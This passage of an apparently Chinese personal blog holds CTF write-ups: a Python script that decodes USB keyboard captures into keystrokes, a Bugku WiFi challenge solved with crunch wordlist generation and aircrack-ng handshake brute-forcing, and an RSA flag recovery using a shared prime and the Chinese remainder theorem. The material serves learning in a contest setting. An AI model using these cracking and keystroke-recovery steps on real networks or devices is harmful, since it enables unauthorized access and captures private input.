class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = open(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>在kali下运行UsbKeyboardDataHacker一步到位</p>
<p>下载地址:<a target="_blank" rel="noopener" href="https://github.com/WangYihang/UsbKeyboardDataHacker">https://github.com/WangYihang/UsbKeyboardDataHacker</a></p>
<h4 id="Bugku-想蹭网先解开密码"><a href="#Bugku-想蹭网先解开密码" class="headerlink" title="Bugku[想蹭网先解开密码]"></a>Bugku[想蹭网先解开密码]</h4><p>Wireshark过滤eapol协议的包，发现通过握手包可以对密码实现暴力破解</p>
<p>在kali中使用Crunch工具生成密码字典</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 11 11 -t 1391040%%%% -o password.txt</span><br></pre></td></tr></table></figure>
<p>使用aircrack -ng工具进行破解 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng wifi.cap -w password.txt</span><br></pre></td></tr></table></figure>
<p>-w后面接的是字典</p>
<p>得到flag</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45555226/article/details/102810474">https://blog.csdn.net/qq_45555226/article/details/102810474</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44108455/article/details/108179086">https://blog.csdn.net/qq_44108455/article/details/108179086</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42025840/article/details/81125584">https://blog.csdn.net/qq_42025840/article/details/81125584</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/15/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/15/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86/" class="post-title-link" itemprop="url">RSAWP(中国剩余定理)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-11-15 12:40:37 / 修改时间：12:42:23" itemprop="dateCreated datePublished" datetime="2020-11-15T12:40:37+08:00">2020-11-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Crypto/" itemprop="url" rel="index"><span itemprop="name">Crypto</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h5 id="题目-RSA-e与φ-n-不互素时"><a href="#题目-RSA-e与φ-n-不互素时" class="headerlink" title="题目:RSA-e与φ(n)不互素时"></a>题目:RSA-e与φ(n)不互素时</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">n1=<span class="number">0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723L</span></span><br><span class="line">e1=<span class="number">0xfae3aL</span></span><br><span class="line">c1=<span class="number">0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaL</span></span><br><span class="line">n2=<span class="number">0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63L</span></span><br><span class="line">e2=<span class="number">0x1f9eaeL</span></span><br><span class="line">c2=<span class="number">0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347L</span></span><br><span class="line"><span class="keyword">assert</span> pow(flag,e1,n1)==c1</span><br><span class="line"><span class="keyword">assert</span> pow(flag,e2,n2)==c2</span><br><span class="line"><span class="keyword">assert</span> gcd(e1,(p1<span class="number">-1</span>)*(q1<span class="number">-1</span>))==<span class="number">14</span></span><br><span class="line"><span class="keyword">assert</span> gcd(e2,(p2<span class="number">-1</span>)*(q2<span class="number">-1</span>))==<span class="number">14</span></span><br></pre></td></tr></table></figure>
<p>0x表示16进制，最后L表示为long型</p>
<h5 id="WP"><a href="#WP" class="headerlink" title="WP:"></a>WP:</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n1=<span class="number">0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723</span></span><br><span class="line">e1=<span class="number">0xfae3a</span></span><br><span class="line">c1=<span class="number">0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbea</span></span><br><span class="line">n2=<span class="number">0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63</span></span><br><span class="line">e2=<span class="number">0x1f9eae</span></span><br><span class="line">c2=<span class="number">0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347</span></span><br><span class="line"></span><br><span class="line">p=libnum.gcd(n1,n2)</span><br><span class="line">q1=gmpy2.mpz(n1//p)</span><br><span class="line">q2=gmpy2.mpz(n2//p)<span class="comment">#注意要用//整除不然计算出的结果会有误</span></span><br><span class="line">fn1=(p<span class="number">-1</span>)*(q1<span class="number">-1</span>)</span><br><span class="line">fn2=(p<span class="number">-1</span>)*(q2<span class="number">-1</span>)</span><br><span class="line">e1=gmpy2.mpz(e1//<span class="number">14</span>)</span><br><span class="line">e2=gmpy2.mpz(e2//<span class="number">14</span>)</span><br><span class="line">d1 = gmpy2.invert(e1,fn1)</span><br><span class="line">d2 = gmpy2.invert(e2,fn2)</span><br><span class="line"></span><br><span class="line">m1=pow(c1,d1,n1)</span><br><span class="line">m2=pow(c2,d2,n2)</span><br><span class="line">c=libnum.solve_crt([m1,m1,m2],[p,q1,q2])<span class="comment">#求解中国剩余定理</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(libnum.gcd(14,(q1-1)*(q2-1)))</span></span><br><span class="line"><span class="comment">#由于存在公约数2，所以整个问题就化简为了e=7，c=...,n=...的新问题</span></span><br><span class="line">e=<span class="number">7</span></span><br><span class="line">n=q1*q2</span><br><span class="line">fn=(q1<span class="number">-1</span>)*(q2<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,fn)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">t=gmpy2.iroot(m, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">print(libnum.n2s(t))</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt=""
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name"></p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">36</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/gorgeousdays" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;gorgeousdays" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:uundefined28@gmail.com" title="E-Mail → mailto:uundefined28@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>
        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

  

</body>
</html>
